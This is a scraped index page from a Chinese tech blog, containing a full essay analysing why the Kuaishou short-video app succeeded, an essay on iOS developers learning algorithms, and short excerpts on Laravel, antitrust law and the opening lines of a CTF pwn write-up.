     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p><a target="_blank" rel="noopener" href="https://github.com/filp/whoops">filp&#x2F;whoops</a> 这个错误处理类库有什么好处我这里就不赘述了，谁用谁知道。</p>
<p>Laravel 在 4.x 时代是有集成了 whoops 的，但是在 5.x 去掉了。不过作为一个 out-of-the-box 的错误处理类库，我们依然可以很方便地将 whoops 带回 Laravel 中。</p>
<p>网上有很多文章都讲述了 Laravel 使用 whoops 的方法，但总有些小问题（像是代码太丑了啊，代码太丑了啊之类的）。其中我认为最优雅的实现是这篇文章所描述的：<a target="_blank" rel="noopener" href="https://mattstauffer.co/blog/bringing-whoops-back-to-laravel-5">Bringing Whoops Back to Laravel 5</a>，我下面的也是基于他给出的代码修改的。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/the-best-method-to-use-whoops-in-laravel/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016-12-18-kuaishou-summary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016-12-18-kuaishou-summary/" itemprop="url">快手为什么成功？</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-18T15:09:49+08:00">
                2016-12-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章整理自我在几个月前和公司产品同事做内部分享的一个小作业。为什么要分析快手？因为快手是一个很有意思的产品，用户数突破得很快。并且我认为网上的很多分析文章并不恰当，特别是知乎里面的部分评价快手的内容。</p>
<h2 id="快手的历史"><a href="#快手的历史" class="headerlink" title="快手的历史"></a>快手的历史</h2><ul>
<li>2011.3 快手诞生。当时叫 GIF 快手，是一款用来制作、分享 GIF 图片的手机应用。</li>
<li>2012.11 GIF 快手转型。将制作的内容存储为视频，只有在分享到其他平台，如微博时，才转换成 GIF 图片</li>
<li>2013.10 确定短视频社交属性。强化社交能力。</li>
<li>2014.11 正式改名为「快手」。同年，快手在 App Store 连续 4 个月居前 50。</li>
<li>2015.6 快手总用户突破 1 亿。 完成 C 轮融资，估值 20 亿美金。</li>
<li>2016.10 快手总用户达 3 亿。</li>
<li>2017.3 快手获得腾讯 3.5 亿美金融资。</li>
</ul>
<h2 id="网上的一些观点"><a href="#网上的一些观点" class="headerlink" title="网上的一些观点"></a>网上的一些观点</h2><h3 id="产品简洁"><a href="#产品简洁" class="headerlink" title="产品简洁"></a>产品简洁</h3><p>一种观点认为：快手成功的秘诀在于产品简洁和克制。这一点上快手确实做得非常特立独行。当你还没有注册登录时，打开快手，此里你能看到的就只有信息流，第一眼给人特别不精致的感觉，如下图所示：</p>
<img src="/images/kuaishou-1.jpg" class="">

<p>但是，如果你仔细看快手在 App Store 上的更新说明的话，你就会发现快手近一年的更新说明只有两条：</p>
<ol>
<li>问题修复以及性能提升</li>
<li>优化用户体验</li>
</ol>
<p>这样的更新说明，不但从时间上超过了一年，而且还以周为频率在迭代。是的，快手的 iOS 很多版本更新时间接近一周，这基本上和苹果审核的速度一致了。也就是说，苹果才审完上一个版本，快手就已经准备好下一个更新版本了。下图是快手在 App Store 的更新记录：</p>
<img src="/images/kuaishou-2.jpg" class="">

<p>但是，我并不认为快手的成功与产品简洁有什么必然关系，因为产品简洁从来都只是加分项，核心问题还是产品解决用户的需求。但是至少应该可以确定的是，快手当前的产品功能简洁并没有限制该产品的流行。</p>
<h3 id="猎奇，自虐，审丑"><a href="#猎奇，自虐，审丑" class="headerlink" title="猎奇，自虐，审丑"></a>猎奇，自虐，审丑</h3><p>微信公众号「X 博士」的有一篇攻击快手的文章，把快手的成功解释成人们的猎奇，自虐，审丑等心理，这篇文章被进一步转载到了知乎上的一个讨论:<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/25529377">如何看待「快手」这个 App</a>，这个转载在讨论中排名第一，获得了 4300 多个赞同。这篇文章其实有很多漏洞，但是即便是知乎这样的平台，质疑这个观点的声音几乎没有。</p>
<p>但是我认为「X 博士」的观点是极不恰当的，后面我会详细解释我的观点。</p>
<h2 id="信息流的两种属性"><a href="#信息流的两种属性" class="headerlink" title="信息流的两种属性"></a>信息流的两种属性</h2><p>很有意思的是，我从毕业开始，就一直在和信息流产品打交道。我毕业时进入网易，做的第一个产品就是网易微博，这是一个信息流产品。之后我作为员工加入猿辅导（之前叫猿题库）参与创业，做的第一个产品叫粉笔网，是一个教育类的微博，这也是一个信息流产品。</p>
<p>做久了之后，我发现信息流产品通常都有两种属性：</p>
<ul>
<li>媒体（新闻）属性</li>
<li>社交属性</li>
</ul>
<p>这两种属性在信息流上面通常会相互抑制，产品方案最终会偏向一种属性，抑制另一种属性。</p>
<p>比如拿新浪微博来说，它的信息流属性就是重媒体，轻社交的，因为：</p>
<ul>
<li>大 V 可以在一瞬间将消息传播出去。</li>
<li>信息的转发设计使得传递成本非常低，容易形成刷屏效果。</li>
<li>关系链完全公开，评论完全公开。</li>
<li>你可以知道当天转发量最高的，最热的（新闻）事件。</li>
</ul>
<p>微博的这种产品特点，会使得新闻事件以及大 V 的信息被更方便的传播，而在上面建立社交圈子则相对不太方便。注意：我这里不是说不能在上面建立社交，实际上微博上也会有一些基于兴趣的小圈子。我只是强调说这个产品设计更「适合」新闻的传播。</p>
<p>而与此相反，微信的朋友圈就是一个重社交，轻媒体的信息流，因为：</p>
<ul>
<li>媒体性质的消息在朋友圈的传递被微信刻意抑制。</li>
<li>朋友圈的营销行为被严重监管。</li>
<li>关系链完全私密，评论严格保密，只能认识的人看见。</li>
<li>你不知道全中国当前看的最多的朋友圈文章是什么，但是能知道你的朋友当前在朋友圈转得最多的文章是什么。所以即便是传播，也是基于你的社交关系，产生的合乎你价值观的内容传播。</li>
</ul>
<h2 id="快手的信息流是什么属性的"><a href="#快手的信息流是什么属性的" class="headerlink" title="快手的信息流是什么属性的"></a>快手的信息流是什么属性的</h2><p>快手的信息流是什么属性的？在得出结论之前，我们先看看快手的产品设计：</p>
<ul>
<li>限制传播：没有转发功能，没有榜单。</li>
<li>没有基于阅读量的推荐。「发现」推荐的内容并不关注阅读量，而是关注别的信息，比如实时性，距离等。</li>
<li>设置中有大量鼓励隐私行为的选项。</li>
</ul>
<p>快手登录后底部有 3 个 tab：关注、发现、同城：</p>
<ul>
<li>「关注」里面当然是自己关注的人发的内容，与大 V 无关。</li>
<li>「发现」一栏中显然不是给大 V 的，因为里面的内容更多的是一些比较及时性的内容，红心数也不太高。后来我们也会聊到，发现中的内容更多是基于推荐的，而不是基于热门的。</li>
<li>「同城」一栏也不是给大 V 的，我翻了很多同城的信息，作者的粉丝数基本上都是个位数，每个信息的红心数也非常少。</li>
</ul>
<p>对于传播的鼓励，只有在快手侧边栏的「八卦」（如下图），能够有可能看到一些自己关注的人的行为。但是这个行为是聚合起来的，所以即使有一篇文章想传播，也比较难通过这个地方获得。</p>
<img src="/images/kuaishou-3.jpg" class="">

<p>所以，你看出来了吗？在产品设计上，快手在抑制信息流的媒体属性。「同城」里面的内容全部都是基本地理位置推荐的内容，很多内容红心数都是个位数，所以不是什么热门内容，快手为什么推荐它们？</p>
<p>我们再想想这些问题：</p>
<ul>
<li>你能在快手上找到当天点赞数最多的视频吗？快手有热门视频榜吗？ – NO！</li>
<li>你能在快手上转发你觉得很赞的视频给你的朋友吗？（我是指快手应用内，转发到微博和朋友圈的不算） – NO！</li>
</ul>
<p>由此我们看出，快手在刻意压制产品的媒体属性，强调社交属性，快手为什么要这么做，等我们看完快手的另一个特点再一起分析.</p>
<p>我们先接着说快手的另一个特点：个性化推荐。</p>
<h2 id="个性化推荐"><a href="#个性化推荐" class="headerlink" title="个性化推荐"></a>个性化推荐</h2><p>经过我的试用，我很快发现快手的推荐算法是可以「调教」的，除了双击给红心以及加关注之外，快手在每个视频顶部的红心旁边，都可以弹出「减少类似作品」的选项，该选项和「取消关注」是放在一起的，所以算是一个非常显眼的位置了。</p>
<img src="/images/kuaishou-4.jpg" class="">

<p>另外我关注了一个魔术的帐号之后，“发现” 里面明显有了更多「魔术」相关的视频出现了。 这个和「今日头条」对比起来，就能感受到差别非常大，我在今日头条上花了一个星期算法调教，他还是给我推荐没有营养的花边社会新闻。</p>
<img src="/images/kuaishou-5.jpg" class="">

<p>快手的个性化推荐做得非常直接和迅速，基本上只需要几次调教，就可以使得 “发现” 里面都是你感兴趣的内容。</p>
<p>好了，这个时候我们可以反驳「X 博士」的观点了，其实「X 博士」看到的猎奇，自虐，审丑的视频，都是由于他一直在给这类视频点赞！如果你不相信的话，最好的办法就是下载快手试一试，看看你能不能找到猎奇，自虐，审丑的视频，我由于开始没有调教对方向，我现在连想找都找不出来。</p>
<h2 id="快手是什么"><a href="#快手是什么" class="headerlink" title="快手是什么"></a>快手是什么</h2><p>介绍了这么多，我们终于可以给快手下一个定义了：</p>
<ul>
<li>它是一个基于视频的信息流。<br> - 它通过 “发现” 功能来推荐和学习你的个人喜好。<br> - 它通过 “同城” 鼓励社交行为。<br> - 它鼓励个人形成自己的圈子，而不是像微博那样，每个人都围绕在大 V 周围。<br> - 它鼓励个人私有圈子（类似朋友圈），它提供了 “私有用户”（关注前需要先经过同意），“禁止陌生人评论”，“禁止陌生人私信” 等设置。</li>
</ul>
<p>好了，这样的快手会面临什么问题？冷启动！由于它的鼓励社交的产品形态，刚开始没人玩的时候，冷启动非常困难。需要运营人员想办法让大家都进来玩。而有意思的是，“发现” 功能刚好又可以弥补你刚来快手，没有建立社交关系的问题。</p>
<h2 id="快手为什么成功"><a href="#快手为什么成功" class="headerlink" title="快手为什么成功"></a>快手为什么成功</h2><p>所以说，知乎上的那篇攻击快手的文章，把快手的成功解释成人们的猎奇，自虐，审丑等心理，我认为是极不恰当的。</p>
<p>首先从功能设计上，鼓励传播的产品形态，更利于猎奇，自虐，审丑这类视频的传播，但是刚刚说了，快手在产品功能设计上，并没有这方面的设计。这么说吧，假如有一个和微博形态一样的 “快手”，那么由于有转发功能，那么这类视频传播起来会更快。但是在快手现在的产品设计中，只能通过 “发现” 功能来传播。而发现功能当前又被设计成学习你的个人喜好，那么很容易形成每个人各自不同的信息呈现。</p>
<p>快手真正成功的原因，我个人它满足了两类需求：</p>
<p> 1、社交需求。它通过运营，让大家形成了一个个的社交圈子，大家在这个圈子里面相互玩，这些圈子里面的人，有你的同学，你的同事，你的朋友，他们即使是随便拍个天空，你都会点个赞，回复一句：天气真好，今天去哪儿玩的啊？也正是因为这样的运营工作太难，快手的发展速度才会这么慢。一个产品从 2011 年上线，经过好几年的运营，才火起来。(和同事聊天，他们另外也提到，2011 年智能手机还太早，微信都还没有流行，所以时间点不合适）</p>
<p> 2、个性化内容获取需求。在社交圈子之外，快手通过 “发现” 的学习，来给你推荐一些基于你兴趣的内容。最终会使得你觉得信息流里面的大量内容都是你感兴趣的，根本停不下来。</p>
<p>这样，你的信息流最终会有两类信息：</p>
<ol>
<li>你的朋友的信息</li>
<li>你觉得有趣的信息</li>
</ol>
<p>显然，构建社交圈子这件事情是整个逻辑中最难实现的，因为有冷启动的问题，这也是为什么快手火得那么慢。但是同时这也是快手的极强的竞争壁垒，即使你发现它成功了，你也无法快速复制它。快手在抑制信息流的媒体属性，加强社交属性这件事情上做得非常克制，也非常果断。</p>
<p>最后，快手除了运营，还做了哪些有助于冷启动的事情呢？我自己的体会是里面段子视频特别多，可能是有一个运营团队在制作这些有趣的视频，放到发现中，以便于大家在没有建立社交关系时，有好玩的内容可看。</p>
<p>我身边的人几乎不用快手，所以我很难体验快手上的社交行为，不过试用几天后，我发现快手上的同城里面，有很多 Live 直播，在快手的直播频道里面，没有美女，只有一些打扮平常的女孩，很多直播点进去只有 3，5 个人在看，但是能感受到他们很熟悉，像聊天一样说着话，开着玩笑，我突然体会到了这就是快手构建的社交圈子，或许每天都有无数个这样的小圈子内的直播在进行着。这些直播间的平常女孩没有任何露骨的表演，但是因为大家认识，所以一切就具有了意义。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>快手是一个兼具个性化推荐和社交属性的短视频信息流产品。通过个性化推荐来解决社交类应用的冷启动问题，同时用社交属性来强化自己 App 的竞争壁垒和内容优势。它的产品方案简洁和克制，解决了人们通过视频打发时间和社交的部分需求，是一款值得学习的 App。</p>
<h2 id="2017-03-23-更新"><a href="#2017-03-23-更新" class="headerlink" title="2017.03.23 更新"></a>2017.03.23 更新</h2><p>就在今天，快手获得了腾讯 3.5 亿美金的融资。本文的产生，使得我有幸和几位快手的朋友一起吃饭聊天，在和他们的聊天中，我得以修正了一些本文的观点：</p>
<ul>
<li>快手的更新说明只说优化性能和修复bug，是一个他们的策略，他们希望让用户自己来发现更新的地方，这样的好处是给用户产生惊喜感。</li>
<li>他们的社交关系还是很弱，比我想的弱很多，大部分人还是围绕着网红。快手的发现功能使得它可以打造很多中等规模的小网红，而不是一些巨型网红，这样一定程度上使得平台的价值没有被削弱。他们提到一些网红转战别的平台，结果发现粉丝都没有跟过去，于是还得回来。</li>
<li>上面那条也解释了为什么快手敢和主播五五分成。</li>
<li>快手每周发布一个版本，其实是一种“发布快车”的模式。他们通常的版本迭代其实是两周，但是他们会每周都上一个版本，谁赶得上谁就上。如果没什么功能可以赶上的，他们也会修复一些bug，保持每周上线一次。</li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016-12-17-flying-big-phenomenon/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016-12-17-flying-big-phenomenon/" itemprop="url">搞 iOS 学算法有意义吗？</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-17T22:27:46+08:00">
                2016-12-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>最近公众号写了两周的面试题，题目有少量涉及算法，有少量涉及底层原理。总有一些人在后台问：面试这个有意义吗？我不会还不是照样做 App。还有一些人说：这些题只适合问应届生。于是我今天就想聊聊这个话题：搞 iOS 开发，研究算法和底层有意义吗？</p>
<p>雷军说：站在风口上，猪都能飞起来。</p>
<p>但是雷军没有说，风口上的风不是一直都吹的。</p>
<p>飞起来的猪，如果没有抓住机会到达彼岸，那么暂时飞一阵子之后，还是会重重地摔到地上。</p>
<p>而 iOS 行业，就是一个最好的例子。</p>
<p>2012 年-2014 年，整个移动开发大火，根本就招不到移动开发的人才，各个公司没有办法，只能让服务器端的同学转岗来学习 iOS 开发。那个时候真是幸福，很多非科班出身的同学，在培训机构经过短短 3 个月的培训，然后就可以拿到上万的薪水。</p>
<p>但是，市场最大的特点就是会自我调节，短短时间内，iOS 开发者就充斥在市场上了，这个市场竟然饱和了。能不饱和吗？有一个读者给我留言，说他以前是做厨师的，因为培训机构说做 iOS 开发收入高，就选择了做开发。</p>
<p>我觉得大家应该理性思考这件事情，如果，我是说如果，iOS 开发真的可以培训 3 个月达到要求，那为什么这个职位的薪资比别的行业远高很多？学当厨师，学修理汽车，学理发，哪一个是短短 3 个月就能够学好的？而厨师，汽车修理工，理发师凭什么工资要比你拿得少？或者这么说，这些厨师，汽车修理工，理发师都不干了，都花 3 个月来学习 iOS 开发，市场会怎么反应？</p>
<p>所以说，你只能选择相信下面两种结论中的一个：</p>
<ul>
<li>iOS 开发不应该是一个高薪行业，因为随便一个人就可以三个月学会。</li>
<li>iOS 开发是一个高薪行业，他们选择招三个月培训出来的，只是暂时人才紧缺。</li>
</ul>
<p>如果你是培训机构出来的，那么赶紧想想自己喜不喜欢这个行业，愿不愿意投入至少一年来积累学习，搞清楚数据结构，操作系统，计算机网络，设计模式，基础算法。计算机程序实际上是逻辑，花时间锻炼自己的逻辑能力，做一些基础的算法题目，这对于你面试也有帮助。</p>
<p>如果你觉得面试的时候考这些没有意义，那么你就再想想你是不是认同这个结论：如果随便一个人都能学会 iOS 开发，你为什么拿那么高薪水，别的公司为什么招你？</p>
<p>如果你真要纠结意义，我可以说得更现实一点，这个行业这么多人想进来，就和每年上千万人想考公务员一样，面试还不是怎么难怎么来啊，而且你真的以为计算机基础真的就一定用不了吗？即便是只有 1% 的地方需要用到计算机基础帮助我们写出更好的 iOS 开发代码，那面试的公司也会问这些的，就像你可能完全不理解 Runloop 是什么也可以写 iOS 程序，但是面试的时候就会考 Runloop，因为就是有那么 1%，甚至 0.1% 的机会你工作中可能会用到它。</p>
<p>不止是 iOS 开发，你以为高考选拔在干嘛？高考考那么难的数学有意义吗？高考语文需要背那么多文章有意义吗？那不然怎么办？每年只有那么一点儿人可以进清华北大，不考难一些，大家分数都一样，怎么公平地选出谁上清华北大？反过来，高考考的那些，真的就完全没有意义吗？是不是还是相对公平地把聪明又努力的人挑出来了？</p>
<p>大家真的别太较真，这个世界就是这么运作的，你觉得做 iOS 开发学算法没有意义，学底层原理没有意义，那你可以不学，但是世界就是这么选拔人才的。</p>
<p>最后，真的不要再问我意义了，我还在风口忙着减肥呢！是的，其实我也很水，我也是一只被风吹起来的猪。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/modify-root-url-and-schema-manually-in-generated-url-by-laravel-url-function/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/modify-root-url-and-schema-manually-in-generated-url-by-laravel-url-function/" itemprop="url">手动修改 Laravel url() 函数生成的 URL 中的根地址</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-17T21:45:42+08:00">
                2016-12-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>大家都晓得 Larevel 的一票帮助函数中有个 <code>url()</code>，可以通过给予的目录生成完整的 URL，是非常方便的一个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// return: https://skin.dev/user/profile</span><br><span class="line">url(&#x27;user/profile&#x27;)</span><br></pre></td></tr></table></figure>

<p>但是这玩意生成的 URL 中要补完的部分是框架内部根据 Request 自动判断的，而自动判断出的东西有时候会出错（譬如在套了一层反向代理之类的情况下）。</p>
<p>文档上并没有提到我们要如何才能自定义它生成的 URL 中的根地址和协议头部分（<code>http(s)</code>），这就非常吃瘪了。那我们要咋办呢？</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/modify-root-url-and-schema-manually-in-generated-url-by-laravel-url-function/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/18-Antimonopoly-Law-Legislation-in-China-and-USA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/18-Antimonopoly-Law-Legislation-in-China-and-USA/" itemprop="url">Antimonopoly Law Legislation in China and USA</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-16T18:31:22+08:00">
                2016-12-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%A7%82%E7%82%B9/" itemprop="url" rel="index">
                    <span itemprop="name">观点</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p><strong>Abstract:</strong> This article explores the facts during the anti-monopoly legislation in the US and China with historical evidence. Small and insufficient firms in the US were more active in lobbying the antitrust legislation, while in China, SOEs and multinational companies were more active. The core problem in the US is whether the country needed an antitrust act at that time, but people in China were concerned more about what should be included in the law. The effect of the implementation of the law in both countries is not as good as expected. The unclear definition of concepts in the Sherman Act and the inefficient distribution of enforcement power in China are the reasons.</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/18-Antimonopoly-Law-Legislation-in-China-and-USA/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/SECCON-CTF-2016-Quals-chat-500/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/SECCON-CTF-2016-Quals-chat-500/" itemprop="url">[SECCON CTF 2016 Quals] chat 500</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-15T22:17:00+08:00">
                2016-12-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 500<br>Author: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, Partial RELRO, 有 canary 和 NX , 沒 PIE.</p>
<p>程式是一個簡易的聊天程式，有點像 twitter :</p>
